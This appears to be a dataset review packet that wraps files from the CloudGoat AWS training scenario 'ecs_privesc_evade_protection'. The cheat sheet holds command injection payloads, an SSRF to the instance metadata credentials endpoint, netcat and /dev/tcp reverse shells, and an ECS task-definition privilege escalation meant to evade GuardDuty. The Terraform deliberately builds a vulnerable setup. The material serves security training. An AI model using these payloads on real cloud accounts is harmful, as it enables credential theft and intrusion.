@@ -1,0 +1,214 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "007629a9fcfb4b4279cd342c28235e011000e525558e6f83b730d8ca50dc1c93",
+  "case_id": "cloudgoat:aws:ecs_privesc_evade_protection",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:ecs_privesc_evade_protection",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "ecs_privesc_evade_protection",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/cheat_sheet.md"
+    ],
+    "terraform_file_count": 13,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/",
+    "review_score": 56,
+    "independence_group": "cloudgoat-scenario:ecs_privesc_evade_protection",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/README.md",
+      "member_sha256": "5a02c3377587dc7ffcafac9f7c5a9fccc7547cfd1af78b46768e35e51278c8fe",
+      "bytes": 2569,
+      "content_kind": "md",
+      "text": "# Scenario: ecs_privesc_evade_protection\n\n**Size**: Medium\n\n**Difficulty**: Moderate\n\n**Command**: `$ ./cloudgoat.py create ecs_privesc_evade_protection`\n\n## Scenario Resources\n\n- 1 ECS with:\n    - 1 * ASG with :\n        - 1 * EC2\n    - 1 * Service (web container)\n- 2 * S3 (1 * secret, 1 * cloudtrail)\n- Detection Mechanisms\n  - GuardDuty enabled\n  - CloudWatch\n  - CloudTrail\n  - EventBridge\n  - Lambda\n  - SES\n\n## Scenario Start(s)\n\nScenario starts as a web user.\n\n> **Warning**: If GuardDuty have enabled before creating scenario, It would cause an error.\n\n> **Warning**: This scenario deploys an intentionally vulnerable web application. Always destroy the scenario when finished to avoid leaving exploitable resources in your AWS account.\n\n> **Note**: Use the docker command during the scenario creation process; the docker environment have to be ready.\n\n## Scenario Goal(s)\n\nRead flag.txt in S3 with avoiding various defense techniques.\n\n## Summary\n\nThere is a very vulnerable website operating on AWS. The site's security administrator became frightened and took some web security measures and enabled GuardDuty for EC2's credentials. Take a detour and approach S3 and win the secret string.\n\n## Email setup\n \n- If AWS Guard Duty detects your attack in the scenario, we will send you an email. So you need to register an email and respond to AWS authentication mail sent to that email before start.\n- If you prefer not to use a standard email address, you might consider services such as https://temp-mail.org/ or https://www.fakemail.net/.\n\n# SPOILER ALERT: There are spoilers for the scenario blew this point.\n\n## Exploitation Route\n\n![Scenario Route(s)](assets/diagram.png)\n\n## Scenario Walk-through\n\n### Easy Path\n- Attacker accesses the web service of a container inside EC2 managed by ECS.\n- The attacker exploits vulnerabilities in a web service to access the EC2's credentials or take control of the container.\n- The attacker accesses S3. Gets the Secret String in `flag.txt` and exits the scenario.\n\n### Hard Path\n- Attacker accesses the web service of a container inside EC2 managed by ECS.\n- The attacker exploits vulnerabilities in a web service to access the EC2's credentials or take control of the container.\n- The attacker defines and executes an ECS task with the authority of the web developer to privesc or bypass mitigations. Perform a reverse shell attack to access the container been created.\n- The attacker accesses S3 at the container to bypass GuardDuty detection. Gets the Secret String in `secret-string.txt` and exits the scenario.\n\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/cheat_sheet.md",
+      "member_sha256": "5765480b163a7180b1792ae3598caf6f6f77f935a663a06cfa5d8e250aedaea3",
+      "bytes": 3732,
+      "content_kind": "md",
+      "text": "# Easy Path\n\nGo to `http://<ec2_ip_address>`\n\n### Command Injection\n\n```bash\n# Command Injection on web.\n; aws s3 ls\n; aws s3 ls s3://<bucket-name>/\n; aws s3 cp s3://<bucket-name>/flag.txt .\n; cat flag.txt\n```\n\n### SSRF\n\n```bash\n# SSRF Attack.\nhttp://<ec2_ip_address>/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>\n\n# Configure credentials.\naws configure --profile attacker\necho \"aws_session_token = <token>\" >> ~/.aws/credentials\n\n# Access to S3.\naws s3 ls\naws s3 ls s3://<bucket-name>/\naws s3 cp s3://<bucket-name>/flag.txt .\ncat flag.txt\n```\n\n\n# Hard Path\n\nGo to `http://<ec2_ip_address>`\n\n### SSRF\n\n* Using IPv6 to SSRF on web with `http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>`\n* Get credentials & using it to your CLI profile.\n\n    ```bash\n    aws configure --profile attacker\n    echo \"aws_session_token = <token>\" >> ~/.aws/credentials\n    ```\n\n### Command Injection\n\n- prepare another host for revshell attack with `nc -lvp 4000`\n- command injection on web with `; nc <ip_address> 4000 -e /bin/sh &`\n\n### For more information\n\n- more information about iam.\n\n    ```bash\n    aws sts get-caller-identity\n    aws iam list-roles\n    aws iam get-role --role-name <role>\n    aws iam list-attached-role-policies --role-name <role>\n    aws iam list-role-policies --role-name <role>\n    aws iam get-role-policy --role-name <role> --policy-name <policy>\n    ````\n\n- more information about ecs clusters.\n\n    ```bash\n    aws ecs list-clusters --region <region>\n    aws ecs describe-clusters --region <region> --clusters <cluster>\n    aws ecs list-container-instances --region <region> --cluster <cluster_arn>\n    ```\n- find available vpc subnets.\n\n    ```bash\n    aws ec2 describe-subnets --region <region>\n    ```\n\n### ECS Privesc\n\n1. Attacker prepare revshell at other public ip point with `nc -lvp 4000`.\n\n2. And now come back to CLI.\n\n3. Create an ECS Task Definition JSON File:\n    \n    Create a file named task-definition.json and include the following content.\n    Replace `<region>`, `<task_name>`, `<task_role_arn>`, `<revshell_ip>`, and `<revshell_port>` with your actual values.\n\n    ```json\n    {\n      \"family\": \"<task_name>\",\n      \"taskRoleArn\": \"<task_role_arn>\",\n      \"networkMode\": \"awsvpc\",\n      \"cpu\": \"256\",\n      \"memory\": \"512\",\n      \"requiresCompatibilities\": [\"FARGATE\"],\n      \"containerDefinitions\": [\n        {\n          \"name\": \"exfil_creds\",\n          \"image\": \"python:latest\",\n          \"entryPoint\": [\"sh\", \"-c\"],\n          \"command\": [\"/bin/bash -c \\\\\\\"bash -i >& /dev/tcp/<revshell_ip>/<revshell_port> 0>&1\\\\\\\"\"]\n        }\n      ]\n    }\n    ```\n\n4. Create an ECS Run Task JSON File.\n\n    Create a file named run-task.json and include the following content. Replace `<subnet>` with the actual values for your setup.\n\n    ```json\n    {\n      \"launchType\": \"FARGATE\",\n      \"networkConfiguration\": {\n        \"awsvpcConfiguration\": {\n          \"assignPublicIp\": \"ENABLED\",\n          \"subnets\": [\"<subnet>\"]\n        }\n      }\n    }\n    ```\n\n5. Register Task Definition and Run Task\n\n    Now, you can use the AWS CLI with the JSON files to execute the commands.\n\n    ```bash\n    # Register task definition\n    aws ecs register-task-definition --region <region> --cli-input-json file://task-definition.json\n   \n   # Run task\n    aws ecs run-task --region <region> --task-definition <task_name> --cluster <cluster_name> --cli-input-json file://run-task.json\n    ```\n\n    After a few minutes, the revshell will be connected by container.\n    Let's access to s3 on revshell.\n\n### Access S3\n\n```bash\napt update\napt install awscli\n\naws s3 ls\naws s3 ls s3://<bucket-name>/\naws s3 cp s3://<bucket-name>/secret-string.txt .\ncat secret-string.txt\n```",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/manifest.yml",
+      "member_sha256": "0653df2f404e4b95174bf5c33731c9fb483393de8ff4adfb69051758747e5ded",
+      "bytes": 1146,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: ecs_privesc_evade_protection\n  # The name of the author(s), comma separated\n- author: Yong Siwoo, Park Do Kyu, Park Seo Hyun, Jung Ho Shim, Chae Jinsoo\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.0\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Within the container that is running a web hosting service on an EC2 instance managed by ECS, \n        please access the metadata service to obtain the temporary credentials for the EC2 instance. \n        Then, exploit these privileges to read the secret string inside the flag.txt file located within S3.\n          \n        Note: if AWS GuardDuty detects your attack, it will refresh the temporary credentials of the EC2 instance \n        and send an alert email to the registered address. \n        Endeavor to proceed with utmost caution to avoid triggering these alerts.\n\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 11-02-2023\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/cloudtrail.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/cloudtrail.tf",
+      "member_sha256": "50acb4ba18e18ab9f8fd23d66bde9696a5e994cc3f07cb5a58bdf1f432d92d41",
+      "bytes": 259,
+      "content_kind": "tf",
+      "text": "# Using CloudTrail for GuardDuty\nresource \"aws_cloudtrail\" \"cloudtrail\" {\n  name           = \"cg-cloudtrail-${var.cgid}\"\n  s3_bucket_name = aws_s3_bucket.cloudtrail_bucket.id\n  enable_logging = true\n\n  depends_on = [aws_s3_bucket_policy.trail_bucket_policy]\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/cloudwatch.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/cloudwatch.tf",
+      "member_sha256": "40515ef113c66fa23d4eaeeee7f5e25a35890ce6a72ca52562321e0de1c815ce",
+      "bytes": 1021,
+      "content_kind": "tf",
+      "text": "# Define a CloudWatch Event Rule to capture AWS GuardDuty findings\nresource \"aws_cloudwatch_event_rule\" \"guardduty_events\" {\n  name        = \"cg-guardduty-events-${var.cgid}\"\n  event_pattern = jsonencode({\n    \"source\" : [\"aws.guardduty\"],\n    \"detail-type\" : [\"GuardDuty Finding\"],\n    \"detail\": {\n      \"type\": [\n        \"UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS\",\n      ]\n    }\n  })\n}\n\n# Create a target for the CloudWatch Event Rule to invoke a Lambda function\nresource \"aws_cloudwatch_event_target\" \"ecs_event_target\" {\n  rule = aws_cloudwatch_event_rule.guardduty_events.name\n  arn  = aws_lambda_function.guardduty_lambda.arn\n}\n\n# Enable AWS GuardDuty for threat detection and continuous monitoring\n# Note : The GuardDuty in the user account must be completely disabled to function normally.\nresource \"aws_guardduty_detector\" \"detector\" {\n  enable = true\n}\n\nresource \"aws_cloudwatch_log_group\" \"lambda_log\" {\n  name = \"/aws/lambda/${aws_lambda_function.guardduty_lambda.function_name}\"\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/data_sources.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/data_sources.tf",
+      "member_sha256": "89e102f49964e650a3025f2b32c89dd01cfad024a3b9a1167b10df500606b734",
+      "bytes": 843,
+      "content_kind": "tf",
+      "text": "data \"aws_caller_identity\" \"current\" {}\n\n# Search based on tag to get the IP of EC2 that is automatically generated by ASG.\ndata \"aws_instances\" \"asg_instance\" {\n  depends_on = [time_sleep.wait_for_instance]\n\n  instance_tags = {\n    Name = \"cg-ec2-instance-${var.cgid}\"\n  }\n}\n\ndata \"aws_availability_zones\" \"current_az\" {\n  state = \"available\"\n}\n\n# Get AMI of the latest version of Amazon Linux 2 for ECS.\ndata \"aws_ami\" \"latest_amazon_linux\" {\n  most_recent = true\n\n  filter {\n    name   = \"name\"\n    values = [\"amzn2-ami-ecs-hvm-*-x86_64-ebs\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n\n  owners = [\"amazon\"]\n}\n\n# compress index.py to lambda.zip\ndata \"archive_file\" \"lambda_zip\" {\n  type             = \"zip\"\n  source_file      = \"./index.py\"\n  output_file_mode = \"0666\"\n  output_path      = \"./lambda.zip\"\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/ecr.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/ecr.tf",
+      "member_sha256": "aa0d889e4524a3b914a38700f9fb175bed32feabdd0e093123fa61b941214b53",
+      "bytes": 966,
+      "content_kind": "tf",
+      "text": "resource \"aws_ecr_repository\" \"repository\" {\n  name = \"cg-repository-${var.cgid}\"\n}\n\nresource \"null_resource\" \"docker_image\" {\n\n  # Push Docker image when the scenario be created\n  provisioner \"local-exec\" {\n    when       = create\n    on_failure = fail\n    command    = \"python3 ./push-dockerfile.py --dockerfile_path ../assets/ssrf-web/ --repository ${aws_ecr_repository.repository.name} --region ${var.region} --profile ${var.profile} --image_tag latest\"\n  }\n\n  # Pop Docker images when the scenario be destroyed\n  provisioner \"local-exec\" {\n    when       = destroy\n    on_failure = fail\n    command    = \"python3 ./pop-dockerfile.py --repository ${self.triggers.repository_name} --region ${self.triggers.region} --profile ${self.triggers.profile} --image_tag all\"\n  }\n\n  triggers = {\n    repository_name = aws_ecr_repository.repository.name\n    region          = var.region\n    profile         = var.profile\n  }\n\n  depends_on = [aws_ecr_repository.repository]\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/ecs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/ecs.tf",
+      "member_sha256": "211b68f67fd3d9ccc8b54bdfc7a9aa4cc412b0aa3e0f253eefdb10414ed514c1",
+      "bytes": 3892,
+      "content_kind": "tf",
+      "text": "# Creating an ECS Cluster.\nresource \"aws_ecs_cluster\" \"cluster\" {\n  name = \"cg-cluster-${var.cgid}\"\n}\n\n# Setting up capacity providers for the ECS Cluster\n# In consideration of the performance issues caused by EC2 created as t2.micro, we also added FARGATE for smooth scenario solving.\nresource \"aws_ecs_cluster_capacity_providers\" \"providers\" {\n  cluster_name = aws_ecs_cluster.cluster.name\n\n  capacity_providers = [\n    \"FARGATE\",\n    \"FARGATE_SPOT\",\n    aws_ecs_capacity_provider.capacity_provider.name\n  ]\n}\n\n# Defining an ECS capacity provider using an Auto Scaling group.\n# ASG would have only one instance.\nresource \"aws_ecs_capacity_provider\" \"capacity_provider\" {\n  name = \"cg-provider-${var.cgid}\"\n\n  auto_scaling_group_provider {\n    auto_scaling_group_arn         = aws_autoscaling_group.asg.arn\n    managed_termination_protection = \"DISABLED\"\n\n    managed_scaling {\n      status                    = \"ENABLED\"\n      maximum_scaling_step_size = 1\n      minimum_scaling_step_size = 1\n      target_capacity           = 50\n    }\n  }\n}\n\n# Defining an ECS capacity provider using an Auto Scaling group.\n# ASG would have only one instance.\nresource \"aws_autoscaling_group\" \"asg\" {\n  name = \"cg-asg-${var.cgid}\"\n\n  desired_capacity    = 1\n  max_size            = 1\n  min_size            = 1\n  vpc_zone_identifier = [aws_subnet.public.id]\n\n  tag {\n    key                 = \"Name\"\n    value               = \"cg-ec2-instance-${var.cgid}\"\n    propagate_at_launch = true\n  }\n\n  launch_template {\n    id      = aws_launch_template.template.id\n    version = \"$Latest\"\n  }\n\n  lifecycle {\n    create_before_destroy = true\n  }\n}\n\n# Define EC2 launch template for ASG.\n# ami            : Amazon Linux 2 for ECS\n# instance type  : t2.micro\n# security_group : allow http (whitelists apply), and all outbound.\n# allow IMDSv1\nresource \"aws_launch_template\" \"template\" {\n  name          = \"cg-launch-template-${var.cgid}\"\n  image_id      = data.aws_ami.latest_amazon_linux.id\n  instance_type = \"t2.micro\"\n\n  iam_instance_profile {\n    name = aws_iam_instance_profile.profile.name\n  }\n\n  network_interfaces {\n    associate_public_ip_address = true\n    security_groups             = [aws_security_group.allow_http.id]\n  }\n\n  metadata_options {\n    http_tokens = \"optional\"\n  }\n\n  user_data = base64encode(\n    <<EOF\n#!/bin/bash\necho ECS_CLUSTER=${aws_ecs_cluster.cluster.name} >> /etc/ecs/ecs.config;\nEOF\n  )\n}\n\n# IAM Role for EC2 instance\nresource \"aws_iam_instance_profile\" \"profile\" {\n  name = \"cg-ec2-role-${var.cgid}\"\n  role = aws_iam_role.ec2_role.name\n}\n\n# Define ECS Service as vulnerable web.\n# Web will be launch on container in EC2.\nresource \"aws_ecs_service\" \"ssrf_web_service\" {\n  name            = \"cg-service-${var.cgid}\"\n  cluster         = aws_ecs_cluster.cluster.id\n  task_definition = aws_ecs_task_definition.web_task.arn\n  launch_type     = \"EC2\"\n  desired_count   = 1\n}\n\n# Define details for Web task.\n# Bridge network for access EC2 metadata.\n# Containers would be imported from ECR\nresource \"aws_ecs_task_definition\" \"web_task\" {\n  family                   = \"cg-task-service-ssrf-web\"\n  network_mode             = \"bridge\"\n  requires_compatibilities = [\"EC2\"]\n  cpu                      = \"512\"\n  memory                   = \"512\"\n  depends_on               = [null_resource.docker_image]\n\n  container_definitions = jsonencode([{\n    name  = \"cg-ssrf-web-${var.cgid}\",\n    image = \"${aws_ecr_repository.repository.repository_url}:latest\"\n\n    portMappings = [{\n      containerPort = 80,\n      hostPort      = 80,\n    }],\n\n    healthCheck = {\n      command     = [\"CMD-SHELL\", \"curl -f http://localhost/ || exit 1\"],\n      interval    = 10,\n      timeout     = 5,\n      retries     = 3,\n      startPeriod = 15\n    }\n  }])\n}\n\n# Wait a little for ec2 be created in ASG.\nresource \"time_sleep\" \"wait_for_instance\" {\n  depends_on = [aws_autoscaling_group.asg]\n  create_duration = \"30s\"\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/iam.tf",
+      "member_sha256": "57e1bb454896208b6ddef6716f24e65b85e03ce4708e5eb6f5e723489c8c820b",
+      "bytes": 6540,
+      "content_kind": "tf",
+      "text": "# Define IAM role for EC2 Instance.\n# Assume that excessive privileges are set for this role.\n# ec2_role & ec2_role_sub are twin role for renewing credentials.\n# Once lambda run, ec2's role would be change to another, and credential's will be renewed.\nresource \"aws_iam_role\" \"ec2_role\" {\n  name = \"cg-web-developer-${var.cgid}\"\n  tags = {\n    deployment_profile = var.profile\n    Stack              = var.stack-name\n    Scenario           = var.scenario-name\n  }\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role\",\n    aws_iam_policy.cg_web_developer_policy.arn\n  ]\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Principal = {\n          Service = [\n            \"ec2.amazonaws.com\",\n            \"ecs-tasks.amazonaws.com\"\n          ]\n        }\n      },\n    ]\n  })\n}\n\n# Define IAM role for EC2 Instance.\n# Assume that excessive privileges are set for this role.\nresource \"aws_iam_role\" \"ec2_role_sub\" {\n  name = \"cg-web-developer-sub-${var.cgid}\"\n  tags = {\n    deployment_profile = var.profile\n    Stack              = var.stack-name\n    Scenario           = var.scenario-name\n  }\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role\",\n    aws_iam_policy.cg_web_developer_policy.arn\n  ]\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Principal = {\n          Service = [\n            \"ec2.amazonaws.com\",\n            \"ecs-tasks.amazonaws.com\"\n          ]\n        }\n      },\n    ]\n  })\n}\n\n# Target of Privesc.\n# Using PassRole, ECS\nresource \"aws_iam_role\" \"s3_access\" {\n  name = \"cg-s3-critical-${var.cgid}\"\n  tags = {\n    deployment_profile = var.profile\n    Stack              = var.stack-name\n    Scenario           = var.scenario-name\n  }\n\n  managed_policy_arns = [\"arn:aws:iam::aws:policy/AmazonS3FullAccess\"]\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Principal = {\n          Service = [\n            \"ecs-tasks.amazonaws.com\"\n          ]\n        }\n      },\n    ]\n  })\n}\n\n# Define Lambda's role for sending mail if GuardDuty detects an attack.\n# The mail will be sent with SES.\nresource \"aws_iam_role\" \"lambda_role\" {\n  name = \"cg-lambda-role-${var.cgid}\"\n  tags = {\n    deployment_profile = var.profile\n    Stack              = var.stack-name\n    Scenario           = var.scenario-name\n  }\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonSESFullAccess\",\n    \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n  ]\n\n  inline_policy {\n    name = \"cg-lambda-inline-policy\"\n    policy = jsonencode({\n      Version = \"2012-10-17\",\n      Statement = [\n        {\n          Effect   = \"Allow\",\n          Action   = [\n            \"iam:DetachRolePolicy\",\n            \"iam:AttachRolePolicy\",\n            \"iam:ListAttachedRolePolicies\",\n            \"iam:GetRole\",\n            \"iam:PassRole\",\n            \"iam:ListAttachedRolePolicies\",\n            \"iam:ListRolePolicies\",\n            \"iam:GetRolePolicy\",\n            \"iam:PutRolePolicy\",\n            \"iam:DeleteRolePolicy\"\n          ],\n          Resource = [\n            aws_iam_role.ec2_role.arn,\n            aws_iam_role.ec2_role_sub.arn\n          ]\n        },{\n          Effect   = \"Allow\",\n          Action   = [\n            \"guardduty:ListFindings\",\n            \"guardduty:UpdateFindingsFeedback\",\n            \"ec2:DescribeIamInstanceProfileAssociations\",\n            \"ec2:ReplaceIamInstanceProfileAssociation\"\n          ],\n          Resource = \"*\"\n        }\n      ]\n    })\n  }\n\n  assume_role_policy = jsonencode({\n    \"Version\" : \"2012-10-17\",\n    \"Statement\" : [\n      {\n        \"Action\" : \"sts:AssumeRole\",\n        \"Effect\" : \"Allow\",\n        \"Principal\" : {\n          \"Service\" : \"lambda.amazonaws.com\"\n        }\n      }\n    ]\n  })\n}\n\n# Even if users play Easy Path, users also can know that secret-string.txt exists but cannot to see what is in.\nresource \"aws_iam_policy\" \"cg_web_developer_policy\" {\n  name   = \"cg-web-developer-policy-${var.cgid}\"\n  policy = jsonencode({\n    Version = \"2012-10-17\",\n    Statement = [\n      {\n        Effect    = \"Allow\",\n        Resource  = \"*\",\n        Action    = [\n          \"ec2:DescribeInstances\",\n          \"ec2:DescribeSubnets\",\n          \"s3:ListAllMyBuckets\",\n          \"ecs:RegisterTaskDefinition\",\n          \"ecs:ListClusters\",\n          \"iam:List*\"\n        ]\n      },{\n        Effect    = \"Allow\",\n        Resource  = [\n          \"arn:aws:ecs:${var.region}:${data.aws_caller_identity.current.account_id}:capacity-provider/cg-provider-${var.cgid}\",\n          \"arn:aws:ecs:${var.region}:${data.aws_caller_identity.current.account_id}:cluster/cg-cluster-${var.cgid}\",\n          \"arn:aws:ecs:${var.region}:${data.aws_caller_identity.current.account_id}:task/cg-cluster-${var.cgid}/*\",\n          \"arn:aws:ecs:${var.region}:${data.aws_caller_identity.current.account_id}:task-definition/*\"\n        ],\n        Action    = [\n          \"ecs:RunTask\",\n          \"ecs:Describe*\",\n          \"ecs:List*\",\n        ]\n      },{\n        Effect    = \"Allow\",\n        Resource  = [\n          aws_s3_bucket.secret-s3-bucket.arn,\n          \"${aws_s3_bucket.secret-s3-bucket.arn}/*\"\n        ],\n        Action    = [\n          \"s3:List*\",\n          \"s3:GetBucketLocation\"\n        ]\n      },{\n        Effect    = \"Allow\",\n        Resource  = \"${aws_s3_bucket.secret-s3-bucket.arn}/flag.txt\",\n        Action    = \"s3:GetObject\"\n      },{\n        Effect    = \"Allow\",\n        Resource  = [\n          aws_iam_role.s3_access.arn,\n          \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:role/cg-web-developer-sub-${var.cgid}\",\n          \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:role/cg-web-developer-${var.cgid}\",\n          \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:policy/cg-web-developer-policy-${var.cgid}\"\n        ],\n        Action    = [\n          \"iam:Get*\",\n          \"iam:PassRole\"\n        ]\n      }\n    ]\n  })\n}\n\n# Getting instance profile for lambda\nresource \"aws_iam_instance_profile\" \"instance_profile_1\" {\n  name = \"cg-instance-profile-${var.cgid}\"\n  role = aws_iam_role.ec2_role.name\n}\n\nresource \"aws_iam_instance_profile\" \"instance_profile_2\" {\n  name = \"cg-instance-profile-sub-${var.cgid}\"\n  role = aws_iam_role.ec2_role_sub.name\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ecs_privesc_evade_protection/terraform/lambda.tf",
+      "member_sha256": "206f55421480f1dd7dc38b6a13343c67693e60b1150e39bb13eae1efe2f1a489",
+      "bytes": 1173,
+      "content_kind": "tf",
+      "text": "# Define Lambda for sending emails.\nresource \"aws_lambda_function\" \"guardduty_lambda\" {\n  function_name = \"cg-guardduty-lambda-${var.cgid}\"\n  role          = aws_iam_role.lambda_role.arn\n  handler       = \"index.lambda_handler\"\n  runtime       = \"python3.11\"\n  timeout       = 10\n  filename      = data.archive_file.lambda_zip.output_path\n\n  environment {\n    variables = {\n      USER_EMAIL            = var.user_email\n      IAM_ROLE_1            = aws_iam_role.ec2_role.name\n      IAM_ROLE_2            = aws_iam_role.ec2_role_sub.name\n      INSTANCE_PROFILE_1    = aws_iam_instance_profile.instance_profile_1.name\n      INSTANCE_PROFILE_2    = aws_iam_instance_profile.instance_profile_2.name\n      GUARDDUTY_DETECTOR_ID = aws_guardduty_detector.detector.id\n      ACCOUNT_ID            = data.aws_caller_identity.current.account_id\n    }\n  }\n}\n\nresource \"aws_lambda_permission\" \"allow_event_bridge\" {\n  statement_id  = \"AllowExecutionFromEventBridge\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.guardduty_lambda.function_name\n  principal     = \"events.amazonaws.com\"\n  source_arn    = aws_cloudwatch_event_rule.guardduty_events.arn\n}\n\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
